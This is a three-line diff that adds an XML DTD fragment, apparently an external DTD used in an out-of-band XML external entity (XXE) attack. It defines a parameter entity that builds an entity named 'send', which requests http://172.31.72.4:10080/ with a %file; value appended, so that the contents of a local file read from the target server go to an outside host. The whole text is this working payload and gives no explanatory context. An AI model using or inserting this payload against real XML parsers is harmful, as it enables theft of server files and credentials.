@@ -1,0 +1,3 @@
+<!ENTITY  % stager "
+ <!ENTITY send SYSTEM 'http://172.31.72.4:10080/?data=%file;'>
+">
